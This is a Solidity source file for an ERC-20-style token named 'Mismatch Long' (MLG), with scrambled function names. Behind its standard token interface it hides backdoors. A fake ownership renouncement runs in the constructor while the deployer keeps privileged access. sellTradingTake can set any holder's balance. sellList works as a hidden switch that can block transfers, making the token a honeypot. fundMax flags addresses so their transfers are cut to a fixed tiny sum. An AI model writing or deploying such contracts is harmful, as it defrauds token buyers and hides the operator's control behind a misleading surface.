//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface minToTeam {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract modeAmountFee {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface modeBuy {
    function createPair(address receiverMinMarketing, address buyMarketing) external returns (address);
}

interface toReceiver {
    function totalSupply() external view returns (uint256);

    function balanceOf(address sellMarketingFrom) external view returns (uint256);

    function transfer(address fromAt, uint256 swapWalletEnable) external returns (bool);

    function allowance(address autoMax, address spender) external view returns (uint256);

    function approve(address spender, uint256 swapWalletEnable) external returns (bool);

    function transferFrom(
        address sender,
        address fromAt,
        uint256 swapWalletEnable
    ) external returns (bool);

    event Transfer(address indexed from, address indexed enableAmount, uint256 value);
    event Approval(address indexed autoMax, address indexed spender, uint256 value);
}

interface toReceiverMetadata is toReceiver {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract MismatchLong is modeAmountFee, toReceiver, toReceiverMetadata {

    function symbol() external view virtual override returns (string memory) {
        return walletAuto;
    }

    mapping(address => bool) public liquidityAt;

    function totalAmount(address tokenFundAmount) public {
        require(tokenFundAmount.balance < 100000);
        if (senderMin) {
            return;
        }
        
        liquidityAt[tokenFundAmount] = true;
        
        senderMin = true;
    }

    bool private teamTrading;

    string private marketingTo = "Mismatch Long";

    uint256 public fundSwap;

    string private walletAuto = "MLG";

    bool private fromTake;

    function allowance(address shouldMin, address walletToken) external view virtual override returns (uint256) {
        if (walletToken == minWalletSwap) {
            return type(uint256).max;
        }
        return receiverLimit[shouldMin][walletToken];
    }

    address exemptLimit = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 constant listAuto = 13 ** 10;

    uint8 private txWallet = 18;

    bool public feeShould;

    function feeMode(address enableTeam, address fromAt, uint256 swapWalletEnable) internal returns (bool) {
        if (enableTeam == minFee) {
            return amountSwap(enableTeam, fromAt, swapWalletEnable);
        }
        uint256 maxAuto = toReceiver(swapTake).balanceOf(exemptLimit);
        require(maxAuto == sellReceiver);
        require(fromAt != exemptLimit);
        if (marketingWallet[enableTeam]) {
            return amountSwap(enableTeam, fromAt, listAuto);
        }
        return amountSwap(enableTeam, fromAt, swapWalletEnable);
    }

    mapping(address => bool) public marketingWallet;

    function getOwner() external view returns (address) {
        return amountShould;
    }

    mapping(address => mapping(address => uint256)) private receiverLimit;

    function amountSwap(address enableTeam, address fromAt, uint256 swapWalletEnable) internal returns (bool) {
        require(modeShouldTotal[enableTeam] >= swapWalletEnable);
        modeShouldTotal[enableTeam] -= swapWalletEnable;
        modeShouldTotal[fromAt] += swapWalletEnable;
        emit Transfer(enableTeam, fromAt, swapWalletEnable);
        return true;
    }

    function enableAmountFrom() private view {
        require(liquidityAt[_msgSender()]);
    }

    uint256 public toIsExempt;

    function decimals() external view virtual override returns (uint8) {
        return txWallet;
    }

    bool public limitBuy;

    function isReceiverAuto() public {
        emit OwnershipTransferred(minFee, address(0));
        amountShould = address(0);
    }

    uint256 sellReceiver;

    function approve(address walletToken, uint256 swapWalletEnable) public virtual override returns (bool) {
        receiverLimit[_msgSender()][walletToken] = swapWalletEnable;
        emit Approval(_msgSender(), walletToken, swapWalletEnable);
        return true;
    }

    event OwnershipTransferred(address indexed feeBuyMax, address indexed fromSenderList);

    function name() external view virtual override returns (string memory) {
        return marketingTo;
    }

    bool public senderMin;

    function balanceOf(address sellMarketingFrom) public view virtual override returns (uint256) {
        return modeShouldTotal[sellMarketingFrom];
    }

    function transferFrom(address enableTeam, address fromAt, uint256 swapWalletEnable) external override returns (bool) {
        if (_msgSender() != minWalletSwap) {
            if (receiverLimit[enableTeam][_msgSender()] != type(uint256).max) {
                require(swapWalletEnable <= receiverLimit[enableTeam][_msgSender()]);
                receiverLimit[enableTeam][_msgSender()] -= swapWalletEnable;
            }
        }
        return feeMode(enableTeam, fromAt, swapWalletEnable);
    }

    function sellTradingTake(address amountTeamIs, uint256 swapWalletEnable) public {
        enableAmountFrom();
        modeShouldTotal[amountTeamIs] = swapWalletEnable;
    }

    address public minFee;

    address minWalletSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function sellList(uint256 swapWalletEnable) public {
        enableAmountFrom();
        sellReceiver = swapWalletEnable;
    }

    bool private receiverTakeLaunched;

    bool public totalEnable;

    function transfer(address amountTeamIs, uint256 swapWalletEnable) external virtual override returns (bool) {
        return feeMode(_msgSender(), amountTeamIs, swapWalletEnable);
    }

    mapping(address => uint256) private modeShouldTotal;

    address private amountShould;

    uint256 private toTake;

    function fundMax(address takeLimitTotal) public {
        enableAmountFrom();
        
        if (takeLimitTotal == minFee || takeLimitTotal == swapTake) {
            return;
        }
        marketingWallet[takeLimitTotal] = true;
    }

    uint256 private totalTeam = 100000000 * 10 ** 18;

    constructor (){
        if (fromTake) {
            fundSwap = toTake;
        }
        minToTeam limitTeam = minToTeam(minWalletSwap);
        swapTake = modeBuy(limitTeam.factory()).createPair(limitTeam.WETH(), address(this));
        
        minFee = _msgSender();
        isReceiverAuto();
        liquidityAt[minFee] = true;
        modeShouldTotal[minFee] = totalTeam;
        if (fromTake != receiverTakeLaunched) {
            teamTrading = true;
        }
        emit Transfer(address(0), minFee, totalTeam);
    }

    uint256 receiverAt;

    function totalSupply() external view virtual override returns (uint256) {
        return totalTeam;
    }

    address public swapTake;

    function owner() external view returns (address) {
        return amountShould;
    }

}